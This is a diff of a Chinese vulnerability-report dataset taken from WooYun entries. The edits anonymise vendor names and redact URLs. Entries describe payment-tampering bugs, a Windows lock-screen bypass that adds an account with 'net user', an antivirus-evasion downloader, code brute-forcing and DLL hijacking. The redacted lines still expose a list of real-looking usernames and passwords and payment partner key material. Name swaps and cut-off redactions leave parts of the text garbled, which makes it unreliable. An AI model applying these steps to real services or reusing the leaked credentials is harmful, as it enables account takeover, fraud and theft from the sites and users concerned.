+**详情**: Android平台某搜索引擎手机浏览器最新版恶意APP攻击代码：恶意APP可以先释放attack.html，然后打开SD卡中的恶意attack.html......public Intent getIntentForSE(String url) {Intent intent = new Intent("android.intent.action.VIEW");intent.setClassName("com.baidu.browser.apps", "com.baidu.browser.framework.BdBrowserActivity");intent.setData(Uri.parse(url));return intent;}try {String url = "file:///mnt/sdcard/attack.html";Intent intent1 = getIntentForS
 
 **POC**: 用测试代码测试。
 
@@ -16039,12 +16039,12 @@
 
 **绕过**: 直接利用
 
-**修复**: 服务器开启SSL，对支付宝返回金额信息进行对比验证
+**修复**: 服务器开启SSL，对某电商平台返回金额信息进行对比验证
 ---
 
 ---
-### [wooyun-2014-076667] 携程某客户端接口缺陷可撞库
-**厂商**: 携程旅行网 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2014-076667] 某旅游平台某客户端接口缺陷可撞库
+**厂商**: 某旅游平台旅行网 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -16077,9 +16077,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 微信关注元祖食品，有个微商城下单抓包，就是辣么简单妥妥的洞= =
+**详情**: 某互联网公司关注元祖食品，有个微商城下单抓包，就是辣么简单妥妥的洞= =
 
-**POC**: 微信关注元祖食品，有个微商城下单抓包，就是辣么简单妥妥的洞= =
+**POC**: 某互联网公司关注元祖食品，有个微商城下单抓包，就是辣么简单妥妥的洞= =
 
 **绕过**: 直接利用
 
@@ -16099,7 +16099,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 简单的说就是没有判断负数导致可以一元买物品首先是选择2个商品加入购物车然后抓包http://www.fhyx.com/auction/buy.htmlcar_pid%5B%5D=678&car_pnum_678=1&car_pid%5B%5D=60&car_pnum_60=1&buy_type=2很明显一个是商品ID 一个是数量修改数量把一元的修改成-19然后付款
+**详情**: 简单的说就是没有判断负数导致可以一元买物品首先是选择2个商品加入购物车然后抓包https://example.com/[已脱敏] 一个是数量修改数量把一元的修改成-19然后付款
 
 **POC**: (见原文)
 
@@ -16121,7 +16121,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://m.leyou.com.cn/支付漏洞，可以任意金额购买商品
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 在支付的时候修改金额，此处修改0.1 元
 
@@ -16131,8 +16131,8 @@
 ---
 
 ---
-### [wooyun-2015-0140813] 百度拼音输入法Win8登陆界面绕过
-**厂商**: 百度 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-0140813] 某搜索引擎拼音输入法Win8登陆界面绕过
+**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -16143,17 +16143,17 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1. 测试程序下载百度拼音输入法最新版，下载地址为http://dl.sz.baidu.com/ime/setup/BaiduPinyinSetup_TN_3.1.2.376_1.exe2. 操作步骤2.1 Win8下安装百度拼音输入法，进入锁屏界面（Win键+L）；2.2 调出“屏幕讲述人”操作界面，切换到百度拼音输入法；2.3 在百度拼音输入法中点击“熊掌”按钮后，在弹出的的界面中选择“皮肤中心”；2.4 选择使用Chrome打开；2.5 Chrome中通过file:///C:/Windows/System32浏览系统目录，并下载cmd.exe；2.6 执行cmd.exe并添加测试账户；相似漏洞：WooYun: 利用百度输入法绕过windows登录和提权服务器
+**详情**: 1. 测试程序下载某搜索引擎拼音输入法最新版，下载地址为https://example.com/[已脱敏] 操作步骤2.1 Win8下安装某搜索引擎拼音输入法，进入锁屏界面（Win键+L）；2.2 调出“屏幕讲述人”操作界面，切换到某搜索引擎拼音输入法；2.3 在某搜索引擎拼音输入法中点击“熊掌”按钮后，在弹出的的界面中选择“皮肤中心”；2.4 选择使用Chrome打开；2.5 Chrome中通过file:///C:/Windows/System32浏览系统目录，并下载cmd.exe；2.6 执行cmd.exe并添加测试账户；相似漏洞：WooYun: 利用某搜索引擎输入法绕过windows登录和提权服务器
 
 **POC**: 通过Chrome调出cmd后，执行net user test 123 /add可以成功添加账户，具体过程参考“详细说明”一节。夜深人静的时候刷漏洞不容易，官人多给点Rank可好？
 
 **绕过**: 过滤绕过
 
-**修复**: 在登陆界面下限制相关操作，可以参考百度五笔输入法的处理方法。
+**修复**: 在登陆界面下限制相关操作，可以参考某搜索引擎五笔输入法的处理方法。
 ---
 
 ---
-### [wooyun-2014-061558] 猎豹极速WIFI通过微信预约改手机时间支付漏洞
+### [wooyun-2014-061558] 猎豹极速WIFI通过某互联网公司预约改手机时间支付漏洞
 **厂商**: 金山网络 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
@@ -16165,7 +16165,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先微信搜索猎豹WIF关键字然后预约猎豹极速WIFI填上地址那啥的，回到手机设置--修改手机时间为5月21日12点然后点进去开抢直接付款就OK
+**详情**: 首先某互联网公司搜索猎豹WIF关键字然后预约猎豹极速WIFI填上地址那啥的，回到手机设置--修改手机时间为5月21日12点然后点进去开抢直接付款就OK
 
 **POC**: 显示付款成功，猎豹你给不给我发货，我就不知道啦~
 
@@ -16187,7 +16187,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 随便选商品!http://www.601601.com/点击立即购买的同时抓包！quantity为数量参数，验证不严格导致可以为负数！我们也可以到购物车改！我就不支付了！不知道支付了会不会邮回来呢？
+**详情**: 随便选商品!https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -16275,7 +16275,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://bbs.onlylady.com/member.php?mod=logging&action=login&referer=http%3A%2F%2Fwww.onlylady.com%2F登录位置的验证码，好像只要不刷新页面就一直不会变然后抓包用户名密码明文的测试可以撞库，这里贴出部分成功帐号：hanyu916	19850916	2889123457	123457	2890wenwen62	9831102	2897yangyi5200	5503178	2903geta	8859518	2907ddd	111111	2911chenchangh	123456	2928397981107	397981107	2949amimoon	630417	2966gfgf	123456	2970jj870528	111111	2984a123456	123456	2989diandi_001
+**详情**: https://example.com/[已脱敏]	19850916	2889123457	123457	2890wenwen62	9831102	2897yangyi5200	5503178	2903geta	8859518	2907ddd	111111	2911chenchangh	123456	2928397981107	397981107	2949amimoon	630417	2966gfgf	123456	2970jj870528	111111	2984a123456	123456	2989diandi_001
 
 **POC**: (见原文)
 
@@ -16297,18 +16297,18 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 参考http://drops.wooyun.org/papers/3771在极速模式下打开这个：http://suggestion.baidu.com/su;/1.bat;?wd=&cb=calc||&sid=1440_2031_1945_1788&t=1362056239875然后它会弹出下载的页面。接着下载打开就直接执行这个了，详情还是要看看参考才行呢
+**详情**: 参考https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: PPT里面还有关于如何修复，这里我就不说了，感兴趣的童鞋可以去看看，附上PPT下载地址：http://dakrsn0w.sectree.cn/RFD.pdf
+**修复**: PPT里面还有关于如何修复，这里我就不说了，感兴趣的童鞋可以去看看，附上PPT下载地址：https://example.com/[已脱敏]
 ---
 
 ---
 ### [wooyun-2014-057128] LOL火力模式BUG已在网上疯传
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -16321,7 +16321,7 @@
 
 **详情**: 这东西我也就是看看，自己就用了一把看看效果。结果现在有人直接拿这个做了一个10M大小的UI来标榜所谓的crack tool鉴于如此那我就直接把源文件放出来一是为了引起足够重视，二是让大家别去下10M的坑爹货。源文件200K都不到，试想一个UI要10M，其中的细节大家自己开动脑筋思考吧各位你们如果在火力模式看到不该出现的英雄，不用怀疑，就是修改了客户端，截图举报吧。
 
-**POC**: 使用方法，把该文件覆盖到 英雄联盟目录\Air\lib下载地址https://www.dropbox.com/s/zr675csfzxoiogy/ClientLibChampionSelectionCore.dathttp://pan.baidu.com/s/1mg3D03u
+**POC**: 使用方法，把该文件覆盖到 英雄联盟目录\Air\lib下载地址https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -16363,9 +16363,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 下载4.6.0版本的PHPMyWind后，安装（包含测试数据），完成后在Chrome中登录后台，复制后台地址备用。（本地地址http://127.0.0.1/phpmywind/admin/）打卡IE，清空缓存，输入上面复制的地址（http://127.0.0.1/phpmywind/admin/），轻轻一按回车，全自动登录，无需帐号密码。
+**详情**: 下载4.6.0版本的PHPMyWind后，安装（包含测试数据），完成后在Chrome中登录后台，复制后台地址备用。（本地地址http://[IP已脱敏]
 
-**POC**: 涉及到网站安全，短时间内提供测试地址http://phpmywind.jycz.tk/admin/ 若已被退出使用帐号密码admin，请勿修改相关信息。
+**POC**: 涉及到网站安全，短时间内提供测试地址https://example.com/[已脱敏] 若已被退出使用帐号密码admin，请勿修改相关信息。
 
 **绕过**: 直接利用
 
@@ -16451,7 +16451,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: APP在各大应用商城都可下载 应用宝为佳http://www.zhuaqianmao.com/about.html 官网http://www.xiaojinniu.com/download_app?f=kp 下载app进入注册页面 以18688888888为例进行在线注册（ps:已拿自己手机验证过 验证码为4位数字）已1234来进行抓包抓包内容为使用burp 进行爆破 验证设置变量 内容从1000-9999跑完了查看返回值大小 可知道是否注册成功在手机端验证提示用户已注册 可见已注册成功 那就去登录吧登录成功
+**详情**: APP在各大应用商城都可下载 应用宝为佳https://example.com/[已脱敏] 官网https://example.com/[已脱敏] 下载app进入注册页面 以18688888888为例进行在线注册（ps:已拿自己手机验证过 验证码为4位数字）已1234来进行抓包抓包内容为使用burp 进行爆破 验证设置变量 内容从1000-9999跑完了查看返回值大小 可知道是否注册成功在手机端验证提示用户已注册 可见已注册成功 那就去登录吧登录成功
 
 **POC**: 密码修改同任意账户注册burp暴力破解一下burp抓包 设置密码修改成功
 
@@ -16506,7 +16506,7 @@
 
 ---
 ### [wooyun-2015-092141] 阿里旺旺2014 DLL劫持漏洞
-**厂商**: 阿里巴巴 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+**厂商**: 某电商平台 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -16539,7 +16539,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://i.yixin.com/ 宜信在线使用手机号注册好 点击进入我的账户此时会进行身份验证，只有投资过验证通过才能进入资产账户，也就是说宜信那边要通过某种方式确认你是投资了，服务端会进行确认或者其他类型操作确认你是投资过的才能通过，正常没有验证通过的用户输入身份证后是这样的下边来抓包看 http请求和响应 都拦截，观察，经过测试查看到其中端倪，看下图中途还进行了一次get请求，没做测试 仅限于做逻辑测试，所以直接看回应包此处服务器返回数据无参数 开发人员开发中利用此项服务器返回值作为验证用户是否投资，客户端返回数据可以修改，经过尝试将值改为1 看返回结果发送下响应到客户端执行，经过 4次回应，如下，已经绕过验证首先确定没有注册邮箱和手机号码，所以肯定收不到校验码，没关系，验证方式还是一样，随便填上校验码提交上抓包，拦截响应继续改，看截图这里需要验证身份此处将自己的邮箱和手机号填上
+**详情**: https://example.com/[已脱敏] 宜信在线使用手机号注册好 点击进入我的账户此时会进行身份验证，只有投资过验证通过才能进入资产账户，也就是说宜信那边要通过某种方式确认你是投资了，服务端会进行确认或者其他类型操作确认你是投资过的才能通过，正常没有验证通过的用户输入身份证后是这样的下边来抓包看 http请求和响应 都拦截，观察，经过测试查看到其中端倪，看下图中途还进行了一次get请求，没做测试 仅限于做逻辑测试，所以直接看回应包此处服务器返回数据无参数 开发人员开发中利用此项服务器返回值作为验证用户是否投资，客户端返回数据可以修改，经过尝试将值改为1 看返回结果发送下响应到客户端执行，经过 4次回应，如下，已经绕过验证首先确定没有注册邮箱和手机号码，所以肯定收不到校验码，没关系，验证方式还是一样，随便填上校验码提交上抓包，拦截响应继续改，看截图这里需要验证身份此处将自己的邮箱和手机号填上
 
 **POC**: 验证方式同一拨开发人员的开发的 问题应该都一样 其他平台位测试，感觉可以刷钱，由于没有正常账号所以未做测试。
 
@@ -16549,8 +16549,8 @@
 ---
 
 ---
-### [wooyun-2012-06667] QQ主显帐号逻辑漏洞
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2012-06667] 某互联网公司主显帐号逻辑漏洞
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -16561,9 +16561,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 已经设置过了，直接查找QQ号码是找不到的
+**详情**: 已经设置过了，直接查找某互联网公司号码是找不到的
 
-**POC**: but,qq for iphone的客户端...ps:漏洞为本人现实好友校长0day发现:)由于木有帐号，本人代为提交.刚刚提交的那个没提交好，再重新提交一次。Sorry
+**POC**: but,某互联网公司 for iphone的客户端...ps:漏洞为本人现实好友校长0day发现:)由于木有帐号，本人代为提交.刚刚提交的那个没提交好，再重新提交一次。Sorry
 
 **绕过**: 直接利用
 
@@ -16571,8 +16571,8 @@
 ---
 
 ---
-### [wooyun-2014-058905] 同时绕过百度启发式引擎和主动防御
-**厂商**: 百度 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2014-058905] 同时绕过某搜索引擎启发式引擎和主动防御
+**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -16583,9 +16583,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: XP停维护了，好多杀软嚷嚷着接微软的班，好吧，现在流行调戏杀毒软件，俺也来凑个热闹，其实以前给公司卖命的时候有N多调戏杀软的东西不能公布分享，现在俺就一个人，也想来乌云添砖加瓦！百度杀毒有4大引擎，卡巴斯基杀毒引擎、云查杀引擎、极光引擎和智能修复引擎，其实新产生的病毒只需要过掉卡巴斯基杀毒引擎和极光引擎就够了。这其实曾经是以前公布过的一个思路，现在不少杀软改正了，但并不彻底。现在拿下载者为例，下载者的恶意特征就是“下载+执行”，大多数启发式杀毒只要看到山寨软件有这个行为就会报毒了，但如果我们把“下载+执行”分成两个文件会怎么样？DownFile.exe负责下载，ExecFile.exe负责把下载下来的东西跑起来，单独看两个文件都是没有恶意行为的，但它们配合到一起，嘿嘿。。。。。你懂的，两个文件配合的方式很多，利用bat、vbs、压缩包、系统回调等等想怎么玩都行。下面是实验过程细节：两个简单
+**详情**: XP停维护了，好多杀软嚷嚷着接微软的班，好吧，现在流行调戏杀毒软件，俺也来凑个热闹，其实以前给公司卖命的时候有N多调戏杀软的东西不能公布分享，现在俺就一个人，也想来乌云添砖加瓦！某搜索引擎杀毒有4大引擎，卡巴斯基杀毒引擎、云查杀引擎、极光引擎和智能修复引擎，其实新产生的病毒只需要过掉卡巴斯基杀毒引擎和极光引擎就够了。这其实曾经是以前公布过的一个思路，现在不少杀软改正了，但并不彻底。现在拿下载者为例，下载者的恶意特征就是“下载+执行”，大多数启发式杀毒只要看到山寨软件有这个行为就会报毒了，但如果我们把“下载+执行”分成两个文件会怎么样？DownFile.exe负责下载，ExecFile.exe负责把下载下来的东西跑起来，单独看两个文件都是没有恶意行为的，但它们配合到一起，嘿嘿。。。。。你懂的，两个文件配合的方式很多，利用bat、vbs、压缩包、系统回调等等想怎么玩都行。下面是实验过程细节：两个简单
 
-**POC**: 注意百度杀毒版本号为测试当天的最新版本，红色圆圈为生成好的下载者压缩包。运行压缩包下载者后，测试用的rar安装包被自动下载并且成功执行，整个过程百度杀毒没有任何提示！程序源码，演示程序，视频等资源联系我都可以公开提供。
+**POC**: 注意某搜索引擎杀毒版本号为测试当天的最新版本，红色圆圈为生成好的下载者压缩包。运行压缩包下载者后，测试用的rar安装包被自动下载并且成功执行，整个过程某搜索引擎杀毒没有任何提示！程序源码，演示程序，视频等资源联系我都可以公开提供。
 
 **绕过**: 直接利用
 
@@ -16607,7 +16607,7 @@
 
 **详情**: 1.网站设计缺陷2.账户明文存储3.波及企业信息
 
-**POC**: 漏洞地址：http://apps.gdnj.gov.cn/njzctg/loginform.jsp（点击账户输入框即可显示所有用户，选择即可登录，密码自动填写）影响地址：http://apps.gdnj.gov.cn/njzctg/login.jsp
+**POC**: 漏洞地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -16649,7 +16649,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 供销大集网站：http://www.ccoop.com.cn/index.html登录后选择购买商品，支持快递配送和物流自提。我先选择民生家乐，民生百货的购物卡很实用哦，这里就选择一张500面值的购物卡这张500面值卡是正常加入购物车购买的，所以是正数，这里在添加一张300面值的卡 我们修改数量为-1然后在添加2张100的卡到购物车 结算为0提交付款即可
+**详情**: 供销大集网站：https://example.com/[已脱敏] 我们修改数量为-1然后在添加2张100的卡到购物车 结算为0提交付款即可
 
 **POC**: (见原文)
 
@@ -16671,9 +16671,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 思路来源：WooYun: QQ浏览器等设计不当可导致用户密码被窃取危害1: 有些网站例如 sinaapp.com ，它的子域名都是由不同开发者开发的，如果有一个开发者恶意在页面中嵌入许多其他该域名下的隐藏登录表单，而用户又保存了该网站的密码，则该密码会自动填写进去。危害2：只要某域名有某个子站沦陷，攻击者无需利用COOKIE等就可以直接获得保存密码表单的用户的密码。 这里为了方便演示，我直接就借用作者的网站了，也懒得构造代码了。
+**详情**: 思路来源：WooYun: 某互联网公司浏览器等设计不当可导致用户密码被窃取危害1: 有些网站例如 sinaapp.com ，它的子域名都是由不同开发者开发的，如果有一个开发者恶意在页面中嵌入许多其他该域名下的隐藏登录表单，而用户又保存了该网站的密码，则该密码会自动填写进去。危害2：只要某域名有某个子站沦陷，攻击者无需利用COOKIE等就可以直接获得保存密码表单的用户的密码。 这里为了方便演示，我直接就借用作者的网站了，也懒得构造代码了。
 
-**POC**: 访问1：http://360tc.sinaapp.com/ 输入用户密码访问2：http://360chi.sinaapp.com/ 就可以获取用户账户密码都可以最新版
+**POC**: 访问1：https://example.com/[已脱敏] 输入用户密码访问2：https://example.com/[已脱敏] 就可以获取用户账户密码都可以最新版
 
 **绕过**: 直接利用
 
@@ -16693,9 +16693,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 思路来源：WooYun: QQ浏览器等设计不当可导致用户密码被窃取危害1: 有些网站例如 sinaapp.com ，它的子域名都是由不同开发者开发的，如果有一个开发者恶意在页面中嵌入许多其他该域名下的隐藏登录表单，而用户又保存了该网站的密码，则该密码会自动填写进去。危害2：只要某域名有某个子站沦陷，攻击者无需利用COOKIE等就可以直接获得保存密码表单的用户的密码。 这里为了方便演示，我直接就借用作者的网站了，也懒得构造代码了。
+**详情**: 思路来源：WooYun: 某互联网公司浏览器等设计不当可导致用户密码被窃取危害1: 有些网站例如 sinaapp.com ，它的子域名都是由不同开发者开发的，如果有一个开发者恶意在页面中嵌入许多其他该域名下的隐藏登录表单，而用户又保存了该网站的密码，则该密码会自动填写进去。危害2：只要某域名有某个子站沦陷，攻击者无需利用COOKIE等就可以直接获得保存密码表单的用户的密码。 这里为了方便演示，我直接就借用作者的网站了，也懒得构造代码了。
 
-**POC**: 访问1：http://360tc.sinaapp.com/ 输入用户账户密码访问2：http://360chi.sinaapp.com/  可以获取用户密码
+**POC**: 访问1：https://example.com/[已脱敏] 输入用户账户密码访问2：https://example.com/[已脱敏]  可以获取用户密码
 
 **绕过**: 直接利用
 
@@ -16715,7 +16715,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.ikang.com/ikang_app/ 下载的apk反编译发现有1.支付宝接口的RSA秘钥明文我找到一个类似案例WooYun: 如家酒店Android客户端程序支付漏洞进敏感信息泄漏2.可能用于破解弱密码的接口 (密码只让设置6位数字...)http://tech.health.ikang.com/app/pub/memberapp/findLimitSelfByCardnumber?cardnumber=11110000******** 可以用于测试账号http://tech.health.ikang.com/app/pub/memberapp/loginCheck?cardnumber=11110000*********&password=***** 可以测试密码
+**详情**: https://example.com/[已脱敏] 下载的apk反编译发现有1.某电商平台接口的RSA秘钥明文我找到一个类似案例WooYun: 如家酒店Android客户端程序支付漏洞进敏感信息泄漏2.可能用于破解弱密码的接口 (密码只让设置6位数字...)https://example.com/[已脱敏] 可以用于测试账号https://example.com/[已脱敏] 可以测试密码
 
 **POC**: package com.ikang.alipay;public class PartnerConfig{public static final String ALIPAY_PLUGIN_NAME = "alipay_plugin_20120428msp.apk";public static final String PARTNER = "2088002383327079";public static final String RSA_ALIPAY_PUBLIC = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDHYQ551qUCTRh/LLzkCoU4ww4Y
 
@@ -16783,7 +16783,7 @@
 
 **详情**: （PS：纽曼看此文前请把这个大漏洞给修了，否则这个洞修了等于没修：WooYun: 纽曼手机官网注入可致秒杀插队（或用户地址泄露））===========================问题根源：www.newman.mobi 的纠结业务体系和不当的程序结合从www.newman.mobi 的摸底情况来看，用户订单和商品管理采用了改动过的ecshop，而秒杀项目“午市”则采取了精简过的phpcms。两者的逻辑通过某些共用的session和缓存等传递。而且还有一个大家可能都想不到的亮点，那就是用了redis作缓存器和k-v存储（其实我很惊叹传统企业敢起用nosql）。以上架构表明，程序员还是有功底的，做过程序结合的人都深感不易（所以认真建议，不要炒人）。但问题是，过分关注架构，可能会导致程序结合不当，导致马奇诺防线问题的产生——你以为大家都会走设定好的通道，结果人家可以抄另一条路达到目的。当然
 
-**POC**: 前期准备：（1）注册两个测试账号（2）安装chrome浏览器、安装插件Tampermonkey（3）编写测试脚本，然后让Tampermonkey以<script>插入到对应通道的页面上。通道一（http://www.newman.mobi/miaosha/ ）的测试脚本，关键点是如何自动弹出验证码和自动重复提交。代码见：http://t.cn/zTAyftL通道二（http://www.newman.mobi/default.php?m=default&c=shop&a=item&id=xx  ）的测试脚本，关键点是如何取消addToCart的重试限制。代码见：http://t.cn/zTAy
+**POC**: 前期准备：（1）注册两个测试账号（2）安装chrome浏览器、安装插件Tampermonkey（3）编写测试脚本，然后让Tampermonkey以<script>插入到对应通道的页面上。通道一（https://example.com/[已脱敏] ）的测试脚本，关键点是如何自动弹出验证码和自动重复提交。代码见：https://example.com/[已脱敏]  ）的测试脚本，关键点是如何取消addToCart的重试限制。代码见：https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
@@ -16825,7 +16825,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 广东省2014年普通高中学业水平考试网上报名系统地址：http://www.eeagd.edu.cn/xyspbm/login.do虽然存在验证码但元素审核时发现图片名和验证码一样的情况可造成暴力破解!获取网页源码-然后提取出那一段元素-配合一个正则得到验证码.接着post提交登录，一个弱口令：123456就能跑到很多人可导致身份证号码、照片、电话号码、地址泄露
+**详情**: 广东省2014年普通高中学业水平考试网上报名系统地址：https://example.com/[已脱敏]
 
 **POC**: 会考证是有规律的，我拿我们学校考号去跑倒是跑出了多个123456由于一些原因我就不发图了。请自行测试！
 
@@ -16847,7 +16847,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在查找用户操作的敏感逻辑中，我们发现整个重制密码的流程存在严重安全隐患，首先自己重置下自己的密码得到如下连接：http://user.lakala.com/default/pwdResetRequestByEmail.do?uid=1000244181&code=9qxHvn7L进入该链接发现即可重新设置密码，关键逻辑代码为：<form id="passwordResetForm" name="passwordResetForm" method="post" action="/default/passwordReset.do"><input type="hidden" id="userId" name="userId" value="1000244181"><ul class="list3"><li><div class="n1">新密码:</div><input type="passwo
+**详情**: 在查找用户操作的敏感逻辑中，我们发现整个重制密码的流程存在严重安全隐患，首先自己重置下自己的密码得到如下连接：https://example.com/[已脱敏] id="passwordResetForm" name="passwordResetForm" method="post" action="/default/passwordReset.do"><input type="hidden" id="userId" name="userId" value="1000244181"><ul class="list3"><li><div class="n1">新密码:</div><input type="passwo
 
 **POC**: 不多说了吧
 
@@ -16879,8 +16879,8 @@
 ---
 
 ---
-### [wooyun-2013-033275] QQ2013的DLL劫持漏洞可被用于后门
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-033275] 某互联网公司2013的DLL劫持漏洞可被用于后门
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -16891,7 +16891,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在干净的win xp操作系统中，如果只用原来的Directx及Flash，不安装新版Directx及Flash，QQ 2013的libcef.dll会加载如下几个不存在的DLL，造成可能的DLL劫持发生，危害性不用说明了吧。（注：该问题对QQ的其它版也应该同样存在，没有一一测试，同时flash的更新也不是必要条件，只是实验时采用如此条件，就说明一下）d3dcompiler_43.dlld3dx9_43.dlllibglesv2.dll
+**详情**: 在干净的win xp操作系统中，如果只用原来的Directx及Flash，不安装新版Directx及Flash，某互联网公司 2013的libcef.dll会加载如下几个不存在的DLL，造成可能的DLL劫持发生，危害性不用说明了吧。（注：该问题对某互联网公司的其它版也应该同样存在，没有一一测试，同时flash的更新也不是必要条件，只是实验时采用如此条件，就说明一下）d3dcompiler_43.dlld3dx9_43.dlllibglesv2.dll
 
 **POC**: 好吧，昨天上报被拒，今天上个图证明一下吧。
 
@@ -16913,7 +16913,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.max78.com/Pay/PayIndex.aspx  存在支付漏洞！
+**详情**: https://example.com/[已脱敏]  存在支付漏洞！
 
 **POC**: (见原文)
 
@@ -16923,8 +16923,8 @@
 ---
 
 ---
-### [wooyun-2013-023152] 微信-腾讯微博认证机制存在严重缺陷 可直接控制他人微博
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2013-023152] 某互联网公司-某互联网公司某社交平台认证机制存在严重缺陷 可直接控制他人某社交平台
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -16935,9 +16935,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 部署在微信m.3g.qq.com的微博接口，仅仅通过用户的一个固定UID进行用户认证，如果直接通过算法算出每个用户的固定md5 UID，即可大面积沦陷腾讯微博业务。具体认证接口如下http://m.3g.qq.com/account.html?uid=59e0434******b3475a17dc10d5ce912&fr=2&aid=aullik5#1 点开微信某个联系人信息#2 复制链接或者在浏览器中打开，你将获得如下认证链接。http://m.3g.qq.com/account.html?uid=59e0434******b3475a17dc10d5ce912&fr=2&aid=aullik5这样即可得到用户的固定md5 UID。#3 利用搜索引擎大面积搜索类似链接#4 利用获取到的UID进行操作#5 成功收听道哥微博
+**详情**: 部署在某互联网公司m.3g.某互联网公司.com的某社交平台接口，仅仅通过用户的一个固定UID进行用户认证，如果直接通过算法算出每个用户的固定md5 UID，即可大面积沦陷某互联网公司某社交平台业务。具体认证接口如下https://example.com/[已脱敏] 点开某互联网公司某个联系人信息#2 复制链接或者在浏览器中打开，你将获得如下认证链接。https://example.com/[已脱敏] UID。#3 利用搜索引擎大面积搜索类似链接#4 利用获取到的UID进行操作#5 成功收听道哥某社交平台
 
-**POC**: 成功收听道哥微博
+**POC**: 成功收听道哥某社交平台
 
 **绕过**: 直接利用
 
@@ -16945,8 +16945,8 @@
 ---
 
 ---
-### [wooyun-2013-024606] QQ程序对URL的识别存在逻辑问题可导致绕过（IE浏览器也存在安全漏洞）
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-024606] 某互联网公司程序对URL的识别存在逻辑问题可导致绕过（IE浏览器也存在安全漏洞）
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -16957,13 +16957,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这个照片的人你认识吗？她说和你吃过饭，你看看http://www.qq.com&e.eeuha.com/ozign
+**详情**: 这个照片的人你认识吗？她说和你吃过饭，你看看https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 跳转到了钓鱼站点QQ程序对URL的识别不精准. 程序员粗心
+**修复**: 跳转到了钓鱼站点某互联网公司程序对URL的识别不精准. 程序员粗心
 ---
 
 ---
@@ -16989,8 +16989,8 @@
 ---
 
 ---
-### [wooyun-2015-092150] 淘宝浏览器DLL劫持漏洞
-**厂商**: 阿里巴巴 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-092150] 某电商平台浏览器DLL劫持漏洞
+**厂商**: 某电商平台 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -17001,7 +17001,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
